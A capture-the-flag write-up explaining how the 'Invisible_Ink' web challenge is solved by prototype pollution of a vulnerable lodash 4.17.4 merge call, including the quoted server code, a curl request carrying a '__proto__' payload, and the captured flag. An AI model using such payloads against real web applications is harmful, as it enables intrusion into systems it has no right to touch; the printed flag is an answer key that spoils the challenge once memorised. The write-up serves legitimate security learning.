# Invisible_Ink
*Expose hidden vulnerabilities in the web application.*

## Solution
1. After some inspection of the code we can se that the following section of the code is interesting and may be exploited to give us the flag:
```javascript
    _.merge(out, req.body);

    if (options.flag) {
        out.flag = flag;
    } else {
        out.flag = 'disabled';
    }

    res.json(out);
    process.exit(0);
```
2. The `_` in `_.merge(...);` refers to `require('lodash')`, and since we are given the [package.json](./original_files/package.json) we can figure out which version of lodash we're using. With this information we can begin looking for vulnerabilities in `lodash` version `4.17.4`.
3. [This article](https://security.snyk.io/vuln/SNYK-JS-LODASHMERGE-173732) give us enough information to (along with info from the given code) craft a payload that leverages prototype pollution and gets the flag.
4. `curl http://invisible-ink.c.ctf-snyk.io/echo -X POST -H "Content-Type: application/json" -d '{"message": {"__proto__": {"flag": "true"}}}`


## Flag
**Flag:** `SNYK{6a6a6fff87f3cfdca056a077804838d4e87f25f6a11e09627062c06f142b10dd}`
